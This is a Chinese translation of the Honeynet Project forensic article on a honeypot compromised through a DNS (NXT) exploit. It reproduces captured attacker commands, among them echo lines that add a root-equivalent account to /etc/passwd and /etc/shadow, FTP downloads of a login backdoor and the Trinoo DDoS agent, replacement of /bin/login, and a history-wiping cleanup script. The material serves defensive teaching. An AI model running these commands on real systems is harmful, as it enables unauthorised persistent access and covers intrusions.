---
title: "了解你的敌人：一次公开的分析"
date: 2000-05-23T00:00:00+08:00
tags: ["Security", "Translation"]
draft: false
slug: "xfocus-honeynet-forensics"
---

> 本文是 Honeynet Project 的"了解你的敌人：一次公开的分析"系列文章的中文翻译，原文发布于 [project.honeynet.org](http://project.honeynet.org/)，中文翻译来自 [xfocus.net](http://www.xfocus.net/)。

此文章是Know Your Enemy系列，前三篇文章涵盖了关于black-hat团体所使用的工具和策略，这文章的目的是怎样一步步成功攻击系统的，这里的重点是在我们怎样知道发生的攻击者和获得信息。也提供你一些分析和熟悉你自身系统上存在的威胁。这里也有一在线，交互的版本发布在[MSNBC](http://www.msnbc.com/news/437641.asp)上。

**背景**

此文信息通过honeypot获得，这里的Honeypot安装在REDHAT6.0上，REDHAT是默认的服务安装，所以讨论的漏洞存在在任意默认安装的REDHAT系统上。而且所有数据没有被处理过。下面分析的所有IP地址，用户帐号，和击键的信息是真实的，除了密码信息，这样是为了更直接的了解整个过程。所有SNIFF信息是通过SNORT格式体现的；[SNORT](http://www.snort.org/)是一个常用的嗅探器，对于检测系统入侵分析来说是一个不错的工具，我使用了在[http://www.whitehats.com/](http://www.whitehats.com/)上的MAX
VISION 的IDS特征。你可以在arachNIDS数据库中查更多有关在此文章中的所有警告信息。你可以在[这里](http://www.xfocus.net/honeynet/papers/forensics/snort.txt)找到我的SNORT配置信息和特征文件，包括我使用的命令行选项。

**攻击行为**

在四月26号，snort提醒我其中的一个系统正受到一个'noop'攻击，信息包装载包含noops的信息，在此情况下，SNORT探测到攻击和记录了警告信息到/var/log/messages文件中（使用[swatch](http://www.xfocus.net/honeynet/papers/forensic/swatch.html)来监控），注意这文中172.16.1.107的IP地址是含有honeypot的机器，其他的地址是black-hat(黑帽子）使用的IP地址。

Apr
26 06:43:05 lisa snort[6283]: [IDS181/nops-x86](http://www.whitehats.com/IDS/181):
63.226.81.13:1351 -> 172.16.1.107:53

我的honeypots[每天](http://www.xfocus.net/honeynet/papers/forensics/probed.txt)接受无数探测，扫描和查询，而且下面的一个警告信息使我注意到其中一个系统可能被破坏，下面的系统LOG信息指示攻击者正开始了一个连接和LOGIN了系统：

Apr
26 06:44:25 victim7 PAM_pwdb[12509]: (login) session opened for user twin by
(uid=0)

Apr 26 06:44:36 victim7 PAM_pwdb[12521]: (su) session opened for user hantu
by twin(uid=506) 

从上面的情况可以看到，入侵者已经获得超级用户权利和控制了整个系统，但这是怎样完成的呢，我们下面开始分析：

**分析**

当分析一攻击的时候，最好的位置是在开始端，即攻击者是从哪里开始的，攻击者一般开始是收集系统信息，可以让他获得系统所存在的漏洞，如果你的系统被破坏，这就表明攻击者不是第一次与你的系统通信了，大多数攻击者必须通过对你系统的连接获得初始化的信息。

所以我们从最开始的信息收集开始，从第一条信息可以知道攻击初于53端口，这表示在我们系统上发动了一个DNS攻击，所以我通过我的[snort
alerts](http://www.enteract.com/%7Elspitz/probed.txt)来发现一些DNS可能的信息探测，我们发现一DNS版本查询探测的信息：

Apr
25 02:08:07 lisa snort[5875]: [IDS277/DNS-version-query](http://dev.whitehats.com/IDS/277):
63.226.81.13:4499 -> 172.16.1.107:53

Apr 25 02:08:07 lisa snort[5875]: [IDS277/DNS-version-query](http://dev.whitehats.com/IDS/277): 63.226.81.13:4630 -> 172.16.1.101:53

注意，这个探测日期是4月25日，我们系统被攻击是在4月26号，系统是在被探测后的一天被入侵的，所以我猜测攻击者是使用一些扫描器扫描出一些关于[DNS漏洞](http://www.cert.org/advisories/CA-2000-03.html)的信息，扫描以后，攻击者查看扫描结果，获得系统漏洞信息，然后启用他们的EXPLOIT。这样我们可以得到如下结论：在4月25号被检测后，后一天被侵入，通过我们的IDS警告，我们获知我们是被DNS漏洞攻击。

**The Exploit**

类似于大多数商业IDS系统，snort可以显示我们所有IP信息包装载数据，我们就使用这功能来分析EXPLOIT，这个EXPLOIT信息可以从snort的LOG记录获得（存储在tcpdump两进制格式）。我查询snort的LOG记录并开始分析攻击开始时候的信息包，我没有把信息限制在仅查询主机63.336.81.13，主要是因为攻击者使用三个不同系统来运行这个EXPLOIT，这个EXPLOIT的目标是在远程主机上获得ROOT
SHELL，一旦攻击者获得ROOT SHELL，他们可以以ROOT身份运行所有命令，还通常会在/etc/passwd和/etc/shadow文件中增加帐号，下面的[细节](http://www.xfocus.net/honeynet/papers/forensics/exploit.html)中是获得ROOT
SHELL后执行的一些命令：

cd /; uname
-a; pwd; id;

Linux apollo.uicmba.edu 2.2.5-15 #1 Mon Apr 19 22:21:09 EDT 1999 i586 unknown

/

uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)

echo "twin::506:506::/home/twin:/bin/bash" >> /etc/passwd

echo "twin:w3nT2H0b6AjM2:::::::" >> /etc/shadow

echo "hantu::0:0::/:/bin/bash" >> /etc/passwd

echo "hantu:w3nT2H0b6AjM2:::::::" >> /etc/shadow

从上面可以知道，攻击者运行了uname -a 查询了系统，和PWD查询当前目录，和ID查看UID，并增加了twin和hantu两个帐号，使用了相同的密码，必须注意，twin使用了UID为506，而hantu使用了UID为0（另一方面hantu是印度尼西亚语言中的鬼魂的意思），要知道，大多数系统中不允许UID为0的帐号远程TELNET，所以起建立了一个可以远程TELNET的帐号，并建立了以后可以SU到ROOT的帐号。在90秒内攻击者利用了EXPLOIT程序进入系统，并获得ROOT权利（可以通过下面的LOG记录）

Apr
26 06:43:05 lisa snort[6283]: [IDS181/nops-x86](http://www.whitehats.com/IDS/181):
63.226.81.13:1351 -> 172.16.1.107:53

Apr 26 06:44:25 victim7 PAM_pwdb[12509]: (login) session opened for user twin
by (uid=0)

Apr 26 06:44:36 victim7 PAM_pwdb[12521]: (su) session opened for user hantu
by twin(uid=506)

现在要分析其下一步将做什么？

**获得访问权利后的活动**

比较幸运的是，TELNET是明文协议，对数据没有进行加密，这表示我们可以解开其踪迹和捕获其击键记录，而snort就做好了这些，这就是snort另一个好处，通过捕获对TELNET会话的击键记录，我们可以判断攻击者在做何工作，snort捕获了不但是STDIN（击键），而且还有STDOUT
和STDER记录，让我们来看看TELNET会话和入侵者的活动吧：注释文件我们用红色来标明).

开始，我们的朋友一twin身份TELNET系统（从213.28.22.189），并获得超级用户身份-hantu，这里要记住他不能以UID为0的身份TELNET。

#' !"'!"# ' 9600,9600'VT5444VT5444

Red Hat Linux release 6.0 (Shedwig)

Kernel 2.2.5-15 on an i586

login: twin

Password: Password: hax0r

No directory /home/twin!

Logging in with home = "/".

[twin@apollo /]$ su hantu

Password: Password: hax0r

下一步，攻击者去其他机器抓取ROOTKIT程序，如下：

[root@apollo /]# ftp 24.112.167.35

Connected to 24.112.167.35.

220 linux FTP server (Version wu-2.5.0(1) Tue Sep 21 16:48:12 EDT 1999) ready.

Name (24.112.167.35:twin): welek

331 Password required for welek.

Password:password

230 User welek logged in.

Remote system type is UNIX.

Using binary mode to transfer files.

ftp> get bj.c

local: bj.c remote: bj.c

200 PORT command successful.

150 Opening BINARY mode data connection for bj.c (1010 bytes).

226 Transfer complete.

1010 bytes received in 0.115 secs (8.6 Kbytes/sec)

ftp> quit

221-You have transferred 1010 bytes in 1 files.

221-Total traffic for this session was 1421 bytes in 1 transfers.

221-Thank you for using the FTP service on linux.

221 Goodbye.

他FTP获得了后门程序，编译了[bj.c](http://www.xfocus.net/honeynet/papers/forensics/bj.txt)，并安装代替了/sbin/login程序，（从下面的记录来看，攻击者使用了COPY和粘贴的工作）：

[root@apollo /]# gcc -o login
bj.cchown root:bin loginchmod 4555 loginchmod u-w logincp /bin/login /usr/bin/xstatcp
/bin/login /usr/bin/old                
rm /bin/loginchmod 555 /usr/bin/xstatchgrp bin /usr/bin/xstatmv login /bin/loginrm
bj.cgcc -o login bj.c

bj.c:16: unterminated string or character constant

bj.c:12: possible real start of unterminated constant

然后他起用了后门程序：

[root@apollo /]# chown root:bin
login

chown: login: No such file or directory

root@apollo /]# chmod 4555 login

chmod: login: No such file or directory

root@apollo /]# chmod u-w login

chmod: login: No such file or directory

root@apollo /]# cp /bin/login /usr/bin/xstat

root@apollo /]# cp /bin/login /usr/bin/old

root@apollo /]# rm /bin/login

root@apollo /]# chmod 555 /usr/bin/xstat

root@apollo /]# chgrp bin /usr/bin/xstat

root@apollo /]# mv login /bin/login

mv: login: No such file or directory

root@apollo /]# rm bj.c

后来从记录来看，攻击者并没有成功，他又一次FTP到站点再次下载了后门：

[root@apollo /]# ftp 24.112.167.35

Connected to 24.112.167.35.

220 linux FTP server (Version wu-2.5.0(1) Tue Sep 21 16:48:12 EDT 1999) ready.

Name (24.112.167.35:twin): [root@apollo /]#   ftp 24.112.167.35

Connected to 24.112.167.35.

220 linux FTP server (Version wu-2.5.0(1) Tue Sep 21 16:48:12 EDT 1999) ready.

Name (24.112.167.35:twin): welek

331 Password required for welek.

Password:331 Password required for welek.

Password:password

230 User welek logged in.

Remote system type is UNIX.

Using binary mode to transfer files.

ftp> get bj.c

qulocal: bj.c remote: bj.c

200 PORT command successful.

u150 Opening BINARY mode data connection for bj.c (1011 bytes).

226 Transfer complete.

1011 bytes received in 0.134 secs (7.3 Kbytes/sec)

ftp> itit

221-You have transferred 1011 bytes in 1 files.

221-Total traffic for this session was 1422 bytes in 1 transfers.

221-Thank you for using the FTP service on linux.

221 Goodbye.

这是攻击者第二次尝试了编译后门，注意他还是使用"cut 和 paste" 命令：

[root@apollo /]# gcc -o login
bj.cchown root:bin loginchmod 4555 loginchmod u-w logincp /bin/login /usr/bin/xstatcp
/bin/login /usr/bin/old                
rm /bin/loginchmod 555 /usr/bin/xstatchgrp bin /usr/bin/xstatmv login /bin/login
rm bj.cgcc -o login bj.c

bj.c: In function `owned':

bj.c:16: warning: assignment makes pointer from integer without a cast

我们注意到编译的后门被采用，并把合法的/bin/login移到和命名为了/usr/bin/xstat，并把编译后的[bj.c](http://www.xfocus.net/honeynet/papers/forensics/bj.txt)代码代替了/bin/login，这个后门程序允许任何人把TERM设定为ct9111可以进行不用认证的访问：

[root@apollo /]# chown root:bin
login

root@apollo /]# chmod 4555 login

root@apollo /]# chmod u-w login

root@apollo /]# cp /bin/login /usr/bin/xstat

cp: /bin/login: No such file or directory

root@apollo /]# cp /bin/login /usr/bin/old

cp: /bin/login: No such file or directory

root@apollo /]# rm /bin/login

rm: cannot remove `/bin/login': No such file or directory

root@apollo /]# chmod 555 /usr/bin/xstat

root@apollo /]# chgrp bin /usr/bin/xstat

root@apollo /]# mv login /bin/login

下面的是攻击者摸去其脚印的活动，我相信他使用了脚本程序，并使用了CUT和PASTE，因为注意所有命令的执行只有一个命令提示符，并从下面的记录我们可以知道这个清理的脚本语言名字为'generic'
,注意它是怎样删除这些文件的：

[root@apollo /]# rm bj.c

[root@apollo /]# [root@apollo /]# ps -aux | grep inetd ; ps -aux | grep portmap
; rm /sbin/portmap ; rm /tmp/h ; rm /usr/sbin/rpc.portmap ; rm -rf .bash* ; rm
-rf /root/.bash_history ; rm -rf /usr/sbin/namedps -aux | grep inetd ; ps -aux
| grep portmap ; rm /sbin/por<grep inetd ; ps -aux | grep portmap ; rm /sbin/port                        
map ; rm /tmp/h ; rm /usr<p portmap ; rm /sbin/portmap ; rm /tmp/h ; rm /usr/                        
sbin/rpc.portmap ; rm -rf<ap ; rm /tmp/h ; rm /usr/sbin/rpc.portmap ; rm -rf                         
.bash* ; rm -rf /root/.ba<bin/rpc.portmap ; rm -rf .bash* ; rm -rf /root/.bas                        
h_history ; rm -rf /usr/s<bash* ; rm -rf /root/.bash_history ; rm -rf /usr/sb                        
in/named

359 ?        00:00:00 inetd

359 ?        00:00:00 inetd

rm: cannot remove `/tmp/h': No such file or directory

rm: cannot remove `/usr/sbin/rpc.portmap': No such file or directory

[root@apollo /]# ps -aux | grep portmap

[root@apollo /]# [root@apollo /]# ps -aux | grep inetd ; ps -aux | grep portmap
; rm /sbin/portmap ; rm /tmp/h ; rm /usr/sbin/rpc.portmap ; rm -rf .bash* ; rm
-rf /root/.bash_history ; rm -rf /usr/sbin/namedps -aux | grep inetd ; ps -aux
| grep portmap ; rm /sbin/por<grep inetd ; ps -aux | grep portmap ; rm /sbin/port                        
map ; rm /tmp/h ; rm /usr<p portmap ; rm /sbin/portmap ; rm /tmp/h ; rm /usr/                        
sbin/rpc.portmap ; rm -rf<ap ; rm /tmp/h ; rm /usr/sbin/rpc.portmap ; rm -rf                         
.bash* ; rm -rf /root/.ba<bin/rpc.portmap ; rm -rf .bash* ; rm -rf /root/.bas                        
h_history ; rm -rf /usr/s<bash* ; rm -rf /root/.bash_history ; rm -rf /usr/sb                        
in/named

359 ?        00:00:00 inetd

rm: cannot remove `/sbin/portmap': No such file or directory

rm: cannot remove `/tmp/h': No such file or directory

>rm: cannot remove `/usr/sbin/rpc.portmap': No such file or directory

[root@apollo /]# rm: cannot remove `/sbin/portmap': No such file or directory

这里发现了一个有趣的事情，这个攻击者使用的generic清理脚本在尝试删除不存在文件的时候产生了错误，我判断攻击者看到了这些信息并尝试了手工删除这些文件，经管这些文件不存在：

rm: cannot remove `/tmp/h':
No such file or directory

rm: cannot remove `/usr/sbin/rpc.portmap': No such file or directory

root@apollo /]# rm: cannot remove `/sbin/portmap': No such file or directory

rm: cannot remove `/tmp/h': No such file or directory

rm: cannot remove `/usr/sbin/rpc.portmap': No such file or directory

root@apollo /]# exit

exit

twin@apollo /]$ exit

logout

到这里为止，他离开了系统，并安装了[BJ.C](http://www.xfocus.net/honeynet/papers/forensics/bj.txt)后门，这个后门允许未认证的访问，只要把TERM设置为VT9111即可。后来，攻击者又多次进行了连接后修改系统。

**返回后的活动，安装trinoo**

在系统被攻击后，我离线检查了系统上的数据，如使用Tripwire，后来，我注意到下一星期多个系统又尝试连接这台机器，很明显攻击者想再次回来，所以，我又把这台机器接上来INTERNET，很好奇想知道这个攻击者想在这机器上再做些什么事情，果然，两星期后，攻击者又回来了，我们再次记录了他的击键记录，检查了TELNET会话进程并知道怎样使我们的系统安装了[TRINO
客户端](http://staff.washington.edu/dittrich/misc/trinoo.analysis)程序：

在5月9号，10：45早上，攻击者从24.7.85.192 再次TELNET机器，注意其设置了VT9111不认证进入了系统：

```
!"' #'!"# ' 9600,9600'VT9111VT9111
Red Hat Linux release 6.0 (Shedwig)
Kernel 2.2.5-15 on an i586
[root@apollo /]# ls
bin cdrom etc home lost+found proc sbin usr
boot dev floppy lib mnt root tmp var
```

在系统上，他想使用DNS，但是，这台机器上的DNS服务已经被破坏，因为DNS被用来EXPLOIT获得ROOT权限，因此系统不能在解析域名了：

[root@apollo /]# nslookup
magix

[root@apollo /]# nslookup irc.powersurf.com

Server:  zeus-internal.uicmba.edu

Address:  172.16.1.101

攻击者在FTP系统到新加坡并下载了一些新的ROOTKIT工具，注意建立了一个.s的隐藏目录并存储了ROOTKIT工具：

[root@apollo /]# mkdir .s

root@apollo /]# cd .s

root@apollo /.s]# ftp nusnet-216-35.dynip.nus.edu.sg

ftp: nusnet-216-35.dynip.nus.edu.sg: Unknown host

ftp> qquituit

root@apollo /.s]# ftpr 137.132.216.35

login: ftrp: command not found

root@apollo /.s]#

root@apollo /.s]# ftp 137.132.216.35

Connected to 137.132.216.35.

220 nusnet-216-35.dynip.nus.edu.sg FTP server (Version wu-2.4.2-VR17(1) Mon
Apr 19 09:21:53 EDT 1999) ready.

他在那台机器上也使用了相同的用户名字：

Name (137.132.216.35:root):
twin

331 Password required for twin.

Password:hax0r

230 User twin logged in.

Remote system type is UNIX.

Using binary mode to transfer files.

ftp> get d.tar.gz

local: d.tar.gz remote: d.tar.gz

200 PORT command successful.

150 Opening BINARY mode data connection for d.tar.gz (8323 bytes).

150 Opening BINARY mode data connection for d.tar.gz (8323 bytes).

226 Transfer complete.

8323 bytes received in 1.36 secs (6 Kbytes/sec)

ftp> quit

221-You have transferred 8323 bytes in 1 files.

221-Total traffic for this session was 8770 bytes in 1 transfers.

221-Thank you for using the FTP service on nusnet-216-35.dynip.nus.edu.sg.

221 Goodbye.

[root@apollo /.s]# gunzip d*

[root@apollo /.s]# tar -xvf d*

daemon/

daemon/ns.c

daemon/ns

[root@apollo /.s]# rm -rf d.tar

root@apollo /.s]# cd daemon

[root@apollo daemon]# chmod u+u+x nsx ns

root@apollo daemon]# ./ns

攻击者安装和使用了Trinoo客户端，下一步他尝试跳到另一台机器，注意他又设置了不同的VT TERM，这次连接没有成功，因为DNS解析没有成功：

[root@apollo daemon]# TERM=vt1711

[root@apollo daemon]# telnet macau.hkg.com

macau.hkg.com: Unknown host

root@apollo daemon]# exit

exit

这个朋友离开不久，并从其他系统上有返回来(137.132.216.35) ：

!"' #'!"# ' 9600,9600'VT9111VT9111

Red Hat Linux release 6.0 (Shedwig)

Kernel 2.2.5-15 on an i586

[apollo /]# TERM=vt9111

telnet ns2.cpcc.cc.nc.us

ns2.cpcc.cc.nc.us: Unknown host

apollo /}#telnet 1 152.43.29.52

Trying 152.43.29.52...

Connected to 152.43.29.52.

Escape character is '^]'.

Connection closed by foreign host.

[root@apollo /]# TERM=vt7877

[root@apollo /]# telnet sparky.w

[root@apollo /]# exit

exit 

根据下面的这些活动，可以知道其尝试使用TRINOO攻击其他系统，这个时候，我断开了系统的连接，攻击者企图使用控制的机器并想破坏其他系统的目的，可以通过监视系统的连接获得：

May 9 11:03:20 lisa snort[2370]:
[IDS/197/trin00-master-to-daemon:](http://www.whitehats.com/IDS/197)
137.132.17.202:2984 -> 172.16.1.107:27444

May 9 11:03:20 lisa snort[2370]: [IDS187/trin00-daemon-to-master-pong:](http://www.whitehats.com/IDS/187)
172.16.1.107:1025 -> 137.132.17.202:31335

May 9 11:26:04 lisa snort[2370]: [IDS197/trin00-master-to-daemon:](http://www.whitehats.com/IDS/197)
137.132.17.202:2988 -> 172.16.1.107:27444

May 9 11:26:04 lisa snort[2370]: [IDS187/trin00-daemon-to-master-pong:](http://www.whitehats.com/IDS/187)
172.16.1.107:1027 -> 137.132.17.202:31335

May 9 20:48:14 lisa snort[2370]: [IDS197/trin00-master-to-daemon:](http://www.whitehats.com/IDS/197)
137.132.17.202:3076 -> 172.16.1.107:27444

May 9 20:48:14 lisa snort[2370]: [IDS187/trin00-daemon-to-master-pong:](http://www.whitehats.com/IDS/187)
172.16.1.107:1028 -> 137.132.17.202:31335

**概括**

我们这里一步步的讲述了我们设置的honeypot服务器是怎样被破坏的，怎样被安置了后门和最后被使用为Trinoo攻击，April 25号，攻击者第一次扫描honeypot的DNS版本，然后在26号，他执行了[NXT-NAMED](http://www.xfocus.net/honeynet/papers/forensics/NXT-Howto.txt)
漏洞利用程序获得了一ROOT SHELL，一旦它获得了ROOT SHELL，她建立了2个系统帐户，twin和hantu,接下来她马上telnet到机器，获得超级用户访问，然后下灾和安装她的后门[bj.c](http://www.xfocus.net/honeynet/papers/forensics/bj.txt)（见下代码），然后她在执行一脚本来清除踪迹，接着离开系统，接下来的星期，她尝试连接系统，但它已经离线了，最后，在5月9号她接着访问，安装和执行Trinoo。到这时我们的honeypot完成了任务。[这里](http://www.xfocus.net/honeynet/papers/forensics/analysis.txt)是一些另外的分析。

**结论**

我们这里讲述了honeypot是如何被入侵的，目的是为了使用Forensic anaylisis系统和IDS记录来了解攻击者动向，通过分析这次分析，你应该对分析系统攻击有一个较好的了解。如果你想了解更多这方面的信息，请看：[怎样构建Honeynet](http://www.xfocus.net/honeynet/papers/honeynet/)

我这里要感谢[Marty Roesch](roesch@hiverworld.com) 和[Max
Vision](vision@whitehats.com)对我们的贡献，没有他们的辛勤工作我做不到这步。所有记录和信息在发表之前已经传递给CERT。而且我们也联系了所有有关这次攻击的IP。
